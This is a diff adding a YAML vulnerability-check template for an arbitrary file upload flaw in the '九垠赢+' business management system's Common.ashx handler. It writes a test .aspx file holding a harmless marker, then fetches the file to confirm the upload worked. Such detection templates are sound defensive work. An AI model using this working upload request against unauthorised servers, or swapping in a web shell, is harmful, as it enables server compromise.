@@ -1,0 +1,31 @@
+id:
+
+info:
+  name: 九垠赢+商业管理系统 Common.ashx 文件上传
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /System/Common.ashx?type=savefile&path=test123.aspx
+  headers:
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+    Accept-Encoding: gzip, deflate
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+    Accept: '*/*'
+    Connection: close
+  data: |
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+    Content-Disposition: form-data; name="content";
+    Content-Type: text/plain
+
+    123456
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+response1:
+requests2:
+  method: GET
+  path: /System/test123.aspx
+response2:
+  code: 200
+  body: 123456
